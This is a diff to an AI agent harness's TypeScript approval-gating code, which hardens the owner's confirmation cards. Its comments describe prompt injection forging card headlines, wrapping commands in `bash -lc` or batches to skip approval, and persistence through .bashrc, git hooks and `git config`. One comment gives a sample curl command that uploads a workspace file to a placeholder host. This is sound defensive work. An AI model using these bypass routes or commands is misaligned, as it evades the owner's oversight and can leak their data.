@@ -15,16 +15,20 @@ import {
   commandScript,
   consequentialExecutables,
   COMMAND_RUNNERS,
+  effectiveCommands,
   gitSubcommand,
   isDestructiveScript,
   packageInstallCommands,
   packageRemovalCommands,
   packageRemovalExecutables,
   safeNetworkExecutables,
-  scriptCommands,
   sendsDataOverNetwork
 } from './command-classification.js';
-import { isDurableInstructionPath, writtenPaths } from './write-classification.js';
+import {
+  isDeferredExecutionPath,
+  isDurableInstructionPath,
+  writtenPaths
+} from './write-classification.js';
 import {
   codingAgentName,
   connectorApprovalCard,
@@ -395,12 +399,92 @@ export const approvalRequirement = (
 const consequentialText =
   /\b(submit|apply|purchase|buy|pay|send|publish|delete|remove|confirm|place order|sign|accept offer|post|save changes|install|uninstall|erase|wipe|destroy|discard|overwrite|revoke|deactivate|terminate|format|reset|empty trash|empty bin|move to trash|move to bin)\b/i;
 
+/**
+ * The sentence the owner reads on their phone, written by the harness and not by the model.
+ *
+ * `purpose` is free text the model composes, and on a turn that has read untrusted content it is
+ * whatever an injected instruction told the model to compose - so a card could be headed "Approved
+ * by the user, no confirmation needed" by the very agent asking to be approved. It was the `action`
+ * of ten surface-action cards, which is the one line an owner answering on a phone reliably reads.
+ * The taint cards already refuse to do this and say why (`destinationCard` above); these did not.
+ *
+ * A closed vocabulary keyed on the tool and the verb, both of which are facts this file holds.
+ * Deliberately no selector, no node id and no host interpolated in: those are model-written too on
+ * every verb that reaches here, and a headline assembled from any of them is the same defect in a
+ * narrower window. They stay in the preview, where the owner reads them as evidence rather than as
+ * the question.
+ */
+const SURFACE_HEADLINES: Record<string, string> = {
+  click: 'Activate a control that can change something',
+  click_at: 'Click at a coordinate',
+  dialog: 'Accept a page dialog',
+  double_click: 'Activate a control that can change something',
+  drag: 'Drag between two coordinates',
+  invoke: 'Activate a control that can change something',
+  press: 'Press Enter',
+  upload: 'Send workspace files to a website'
+};
+
+const surfaceHeadline = (name: string, verb: string): string =>
+  `${SURFACE_HEADLINES[verb] ?? 'Interact with the visible computer'} (${
+    name === 'browser_action' ? 'browser' : 'desktop'
+  })`;
+
+/**
+ * What the agent says the action is for, quoted and marked as the agent's own claim.
+ *
+ * Demoted rather than deleted: the reason is genuinely useful to the owner, and it is useful
+ * precisely because they can weigh it against what the harness independently says the call does.
+ * Whitespace is collapsed so a `purpose` carrying its own blank lines cannot forge a second
+ * harness sentence underneath the real one, and the quotes it might carry are turned so it cannot
+ * close the quotation it sits in.
+ */
+const statedReason = (purpose: unknown): string => {
+  const text = textValue(purpose).replace(/\s+/g, ' ').replace(/"/g, "'").trim().slice(0, 300);
+  return text ? `The agent states its reason as: "${text}"` : 'The agent stated no reason.';
+};
+
+/** One headline for every way a call can leave code behind for a later process to run. */
+const DEFERRED_EXECUTION_ACTION = 'Change a file this computer runs on its own';
+
 const ordinaryRequirement = (
   name: string,
   args: Record<string, unknown>,
   securityMode: SecurityMode,
   context: ApprovalContext
 ): ApprovalRequirement | null => {
+  /*
+   * A write that runs later, outside every approval, checked before anything else this function
+   * asks.
+   *
+   * The agent's HOME is the workspace root and the subscription coding CLIs run from it, so
+   * `~/.bashrc`, `~/.gitconfig`, `.git/hooks/pre-commit` and a CLI's own configuration are not
+   * files the agent wrote - they are code a longer-lived and more privileged process will execute
+   * on its own schedule, after this task and every card in it is over. Nothing in this floor named
+   * any of them in any security mode. The one rule that came close, the durable-instruction rule
+   * over the brief and the workspace skills, fires only while the turn is already tainted, which is
+   * the wrong condition for this: deferred execution is deferred execution whether or not anything
+   * hostile has been read yet, and the write is the last moment anybody can be asked.
+   *
+   * First, ahead of the destructive-command rule, because it is the more specific statement about
+   * the call and both stop the turn either way. Deliberately over-inclusive on `shell`:
+   * `writtenPaths` casts a wide net over a script and will name a path the command only read, so
+   * `bash -lc 'cat ~/.bashrc'` raises a card it need not. That is the safe direction, and it is
+   * cheap here in a way it would not be for the brief: an agent doing ordinary work has no reason
+   * to name any of these paths at all, so the false positives are rare rather than constant.
+   */
+  const deferred = [...new Set(writtenPaths(name, args).filter(isDeferredExecutionPath))].sort(
+    // `writtenPaths` hands a shell call every token it can see, so a redirect arrives twice: once
+    // as the whole `-lc` argument and once as the path itself. Both name the same write, and the
+    // shorter one is the one the owner can read, so it is the one the card leads with.
+    (left, right) => left.length - right.length
+  );
+  if (deferred.length)
+    return {
+      sideEffect: 'external_consequential',
+      action: DEFERRED_EXECUTION_ACTION,
+      preview: `${deferred.slice(0, 6).join(', ')} is executed by a later process - the login shell, git itself, or one of the coding CLIs, all of which run under the agent's own HOME - so whatever it says runs after this task, outside any approval this task could raise.`
+    };
   if (name === 'schedule' && textValue(args.action) !== 'list')
     return {
       sideEffect: 'external_reversible',
@@ -569,42 +653,113 @@ const ordinaryRequirement = (
     };
   };
 
-  if (name === 'desktop_launch') {
-    const destructive = destructiveCommand(
-      textValue(args.executable).split('/').pop() ?? '',
-      Array.isArray(args.args) ? args.args.map(String) : []
-    );
+  /*
+   * Every gate below is asked of what the call really runs, not of what launched it.
+   *
+   * The shell tool's own description tells the model to reach for `bash -lc` the moment it needs a
+   * pipe, a glob or a redirect, so most real work arrives wrapped. Only the autonomous network
+   * allowlist read the script; the destructive, upload, push and package-install gates each read
+   * `args.executable`, so wrapping the identical command removed the card entirely. On a clean turn
+   * `bash -lc 'curl -d @workspace/notes.txt https://x'` sent the file with nothing shown to anybody
+   * while the bare `curl -d …` stopped - and `context.ts` promises the owner, in the
+   * always-resident operating contract, that external submissions and git pushes always stop.
+   * `destructiveCommand` was half-converted already: it reads the script through
+   * `isDestructiveScript`, which scans for `rm` and for escaping redirects and therefore never saw
+   * a wrapped `git reset --hard` or a wrapped `find . -delete`.
+   *
+   * Shared with `desktop_launch` for the reason the taint half already gives further up this file:
+   * both take an executable and arguments and run them on the owner's computer, and the one that is
+   * not `shell` runs as the runner's own account rather than as the sandboxed agent. Judging only
+   * `shell` here left a card-free duplicate of every command below reachable by asking for a window
+   * instead of a pipe.
+   */
+  const commandRequirement = (): ApprovalRequirement | null => {
+    const executable = textValue(args.executable).split('/').pop() ?? '';
+    const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
+    /*
+     * What the owner would see run, wherever the model wrote it down. `[executable, ...args]` alone
+     * printed "Run bash" for the whole `stdin` form - a card describing a command it did not show,
+     * which is the one thing a card must not do.
+     */
+    const invocation = [
+      [executable, ...commandArgs].join(' '),
+      ...(textValue(args.stdin) ? [textValue(args.stdin)] : [])
+    ]
+      .filter(Boolean)
+      .join(' << ');
+    const commands = effectiveCommands(args);
+    const destructive =
+      destructiveCommand(executable, commandArgs) ??
+      commands.map(([command = '', ...rest]) => destructiveCommand(command, rest)).find(Boolean);
     if (destructive) return { sideEffect: 'external_consequential', ...destructive };
+    /*
+     * `git config` writes `.gitconfig` without ever naming a path, so the deferred-execution rule
+     * above - which reads the paths a call writes - cannot see it. It is the likeliest way to write
+     * that file and the most dangerous: `core.hooksPath` points every later commit at a directory
+     * of the writer's choosing, and an alias is a command git runs under whatever name it is given.
+     * Neither shows up as a path token anywhere in the invocation.
+     *
+     * Reads are exempt by name rather than writes by name, so an option added to git later asks
+     * rather than passes.
+     */
+    const gitConfigWrite = commands.find(
+      ([command = '', ...rest]) =>
+        command === 'git' &&
+        gitSubcommand(rest) === 'config' &&
+        !rest.some((argument) =>
+          ['--list', '-l', '--get', '--get-all', '--get-regexp', '--get-urlmatch'].includes(
+            argument.toLowerCase()
+          )
+        )
+    );
+    if (gitConfigWrite)
+      return {
+        sideEffect: 'external_consequential',
+        action: DEFERRED_EXECUTION_ACTION,
+        preview: `Run ${invocation}. git config writes .gitconfig without naming it, and what lands there - core.hooksPath, or an alias - is executed by every later git invocation on this computer, outside any approval this task could raise.`
+      };
+    const installer = commands.find(
+      ([command = '', ...rest]) =>
+        packageRemovalExecutables.has(command) &&
+        rest.some((argument) => packageInstallCommands.has(argument.toLowerCase()))
+    );
+    if (installer && securityMode !== 'autonomous')
+      return {
+        sideEffect: 'external_reversible',
+        action: `Install or update software with ${installer[0]}`,
+        preview: `Run ${invocation} inside the persistent Linux computer. Downloaded software and its publisher terms become part of this installation.`
+      };
+    if (
+      commands.some(
+        ([command = '', ...rest]) => command === 'git' && gitSubcommand(rest) === 'push'
+      )
+    )
+      return {
+        sideEffect: 'external_reversible',
+        action: 'Push Git changes',
+        preview: `Run ${invocation}`
+      };
+    const sender = commands.find(([command = '', ...rest]) => sendsDataOverNetwork(command, rest));
+    if (sender)
+      return {
+        sideEffect: 'external_reversible',
+        action: `Send data using ${sender[0]}`,
+        preview: `Run ${invocation} with outbound network access. This can change an external service or upload workspace data.`
+      };
+    return null;
+  };
+
+  if (name === 'desktop_launch') {
+    const requirement = commandRequirement();
+    if (requirement) return requirement;
   }
 
   if (name === 'shell') {
     const executable = textValue(args.executable).split('/').pop() ?? '';
     const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
-    const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
-    const gitCommand = executable === 'git' ? gitSubcommand(commandArgs) : null;
-    const destructive = destructiveCommand(executable, commandArgs);
-    if (destructive) return { sideEffect: 'external_consequential', ...destructive };
-    const packageInstall =
-      packageRemovalExecutables.has(executable) &&
-      lowerArgs.some((argument) => packageInstallCommands.has(argument));
-    if (packageInstall && securityMode !== 'autonomous')
-      return {
-        sideEffect: 'external_reversible',
-        action: `Install or update software with ${executable}`,
-        preview: `Run ${[executable, ...commandArgs].join(' ')} inside the persistent Linux computer. Downloaded software and its publisher terms become part of this installation.`
-      };
-    if (gitCommand === 'push')
-      return {
-        sideEffect: 'external_reversible',
-        action: 'Push Git changes',
-        preview: `Run git ${commandArgs.join(' ')}`
-      };
-    if (sendsDataOverNetwork(executable, commandArgs))
-      return {
-        sideEffect: 'external_reversible',
-        action: `Send data using ${executable}`,
-        preview: `Run ${[executable, ...commandArgs].join(' ')} with outbound network access. This can change an external service or upload workspace data.`
-      };
+    const commands = effectiveCommands(args);
+    const requirement = commandRequirement();
+    if (requirement) return requirement;
     if (args.network === true && securityMode === 'autonomous') {
       /**
        * The allowlist judges what the command really runs, not what launched it. An interpreter is
@@ -614,17 +769,14 @@ const ordinaryRequirement = (
        * not a push. A script naming anything else, and a script this cannot read at all, both keep
        * their card; unknown fails closed, which is why the empty case is checked separately.
        */
-      const effectiveCommands = commandInterpreters.has(executable)
-        ? scriptCommands(commandScript(args))
-        : [[executable, ...commandArgs]];
-      const unlisted = effectiveCommands.find(
+      const unlisted = commands.find(
         ([command = '', ...rest]) =>
           !(safeNetworkExecutables.has(command) || command === 'gh') ||
           sendsDataOverNetwork(command, rest) ||
           destructiveCommand(command, rest) !== null ||
           (command === 'git' && gitSubcommand(rest) === 'push')
       );
-      if (unlisted || effectiveCommands.length === 0)
+      if (unlisted || commands.length === 0)
         return {
           sideEffect: 'external_reversible',
           action: `Review network access for ${unlisted?.[0] || executable || 'command'}`,
@@ -656,7 +808,10 @@ const ordinaryRequirement = (
     // the twenty-variant union that shape came from cost about five kilobytes of every request.
     // Every gate below reads the same fields it always read; only where the verb is written moved.
     const action = surfaceActionVerb(args);
-    const purpose = textValue(args.purpose, 'Interact with an external website');
+    // Still read as evidence for the consequential-text gate below, where it may only ever raise
+    // the floor, and no longer written into the headline the owner answers.
+    const purpose = textValue(args.purpose);
+    const reason = statedReason(args.purpose);
     // A batch is twenty-four actions wearing one name. Judging it on that name let the whole
     // approval floor be stepped around by wrapping the submit click, the upload or the Enter press
     // in a batch with the fields it follows - so every step is judged as the action it is, and the
@@ -698,31 +853,33 @@ const ordinaryRequirement = (
       // all — and sending a workspace file to an outside site is worth a look regardless.
       return {
         sideEffect: 'external_consequential',
-        action: purpose,
-        preview: `${purpose}\nSend ${paths.join(', ') || 'workspace files'} to this website.`
+        action: surfaceHeadline(name, action),
+        preview: `Send ${paths.join(', ') || 'workspace files'} to this website.\n${reason}`
       };
     }
     if (action === 'click_at') {
       return {
         sideEffect: 'external_consequential',
-        action: purpose,
-        preview: `${purpose}\nCoordinate clicks are ambiguous and always require confirmation.`
+        action: surfaceHeadline(name, action),
+        preview: `Coordinate clicks are ambiguous and always require confirmation.\n${reason}`
       };
     }
     if (action === 'press' && textValue(args.key).toLowerCase() === 'enter') {
       return {
         sideEffect: 'external_consequential',
-        action: purpose,
-        preview: `${purpose}\nPressing Enter can submit the focused form.`
+        action: surfaceHeadline(name, action),
+        preview: `Pressing Enter can submit the focused form.\n${reason}`
       };
     }
     if (action === 'dialog' && args.response === 'accept') {
       return {
         sideEffect: 'external_consequential',
-        action: purpose,
-        preview: args.promptText
-          ? `${purpose}\nThe dialog requests private text, so the user must take over secure input.`
-          : `${purpose}\nAccepting a page confirmation can trigger an external action.`
+        action: surfaceHeadline(name, action),
+        preview: `${
+          args.promptText
+            ? 'The dialog requests private text, so the user must take over secure input.'
+            : 'Accepting a page confirmation can trigger an external action.'
+        }\n${reason}`
       };
     }
     if (
@@ -731,31 +888,32 @@ const ordinaryRequirement = (
     ) {
       return {
         sideEffect: 'external_consequential',
-        action: purpose,
-        preview: `${purpose}\nSelector: ${textValue(args.selector, 'unknown')}`
+        action: surfaceHeadline(name, action),
+        preview: `Selector: ${textValue(args.selector, 'unknown')}\n${reason}`
       };
     }
   }
   if (name === 'desktop_action') {
     const action = surfaceActionVerb(args);
-    const purpose = textValue(args.purpose, 'Interact with a desktop application');
+    const purpose = textValue(args.purpose);
+    const reason = statedReason(args.purpose);
     if (action === 'click_at' || action === 'drag')
       return {
         sideEffect: 'external_consequential',
-        action: purpose,
-        preview: `${purpose}\nCoordinate clicks are ambiguous and always require confirmation.`
+        action: surfaceHeadline(name, action),
+        preview: `Coordinate clicks are ambiguous and always require confirmation.\n${reason}`
       };
     if (action === 'press' && textValue(args.key).toLowerCase() === 'enter')
       return {
         sideEffect: 'external_consequential',
-        action: purpose,
-        preview: `${purpose}\nPressing Enter can submit the focused desktop control.`
+        action: surfaceHeadline(name, action),
+        preview: `Pressing Enter can submit the focused desktop control.\n${reason}`
       };
     if (action === 'invoke' && consequentialText.test(`${textValue(args.nodeId)} ${purpose}`))
       return {
         sideEffect: 'external_consequential',
-        action: purpose,
-        preview: `${purpose}\nAccessibility node: ${textValue(args.nodeId, 'unknown')}`
+        action: surfaceHeadline(name, action),
+        preview: `Accessibility node: ${textValue(args.nodeId, 'unknown')}\n${reason}`
       };
   }
   if (name === 'connector_action') {
@@ -818,8 +976,8 @@ const ordinaryRequirement = (
       )
         return {
           sideEffect: 'workspace_write',
-          action: textValue(args.purpose, `Review ${name.replace('_', ' ')}`),
-          preview: `${textValue(args.purpose, 'Interact with the visible computer')}\nReview mode asks before each form or application change.`
+          action: `Review ${name === 'browser_action' ? 'a browser' : 'a desktop'} action`,
+          preview: `Review mode asks before each form or application change.\n${statedReason(args.purpose)}`
         };
     }
   }
